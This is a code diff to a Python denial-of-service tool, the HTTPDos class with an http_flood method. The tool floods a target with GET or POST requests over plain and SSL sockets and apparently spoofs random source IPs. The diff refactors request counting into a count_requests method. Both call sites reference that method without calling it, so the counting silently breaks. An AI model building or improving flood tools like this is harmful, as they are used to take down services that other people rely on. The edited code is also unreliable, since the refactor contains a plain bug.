@@ -22,14 +22,15 @@ class HTTPDos():
         self.udp_size_bytes = udp_size_bytes
         self.thread_number = thread_number
         self.ssl_available = False
+        self.counter = itertools.count(1)
 
     def http_flood(self):
         """
         HTTP(S) flood
         """
-        if self.http_method == 'get':
+        if self.http_method == 'GET':
             request_func = self.get_http_request
-        elif self.http_method == 'post':
+        elif self.http_method == 'POST':
             request_func = self.post_http_request
         else:
             sys.exit(color_text(
@@ -39,7 +40,7 @@ class HTTPDos():
         time.sleep(1)
         color_text('yellow', '[+] Start sending')
 
-        counter = itertools.count(1)  # counter
+        
 
         if self.protocol == 'https':
             self.ssl_available = self.test_ssl_connection()
@@ -59,11 +60,7 @@ class HTTPDos():
                 ssl_sock.send(request_func())
                 ssl_sock.close()
 
-                i = next(counter)
-
-                if i % 1000 == 0:
-                    sys.stdout.write(f'{i} request send !\r\n')
-                    sys.stdout.flush()
+                self.count_requests
         else:
             if self.protocol == 'https':  # if https failure, testing http
                 color_text(
@@ -75,11 +72,7 @@ class HTTPDos():
                 sock.send(request_func())
                 sock.close()
 
-                i = next(counter)
-
-                if i % 10_000 == 0:
-                    sys.stdout.write(f'{i} request send !\r\n')
-                    sys.stdout.flush()
+                self.count_requests
 
     def test_ssl_connection(self):
         """Fonction pour tester si SSL est disponible sur le serveur"""
@@ -102,6 +95,14 @@ class HTTPDos():
             self.target_port = 80  # if https is not valide, test on http port 80 by default
 
             return False
+
+    def count_requests(self):
+
+        request_nb = next(self.counter)
+        
+        if request_nb % 10_000 == 0:
+            sys.stdout.write(f'{request_nb} request send !\r\n')
+            sys.stdout.flush()
 
     def get_http_request(self):
         random_ip = self.http_random_ip()
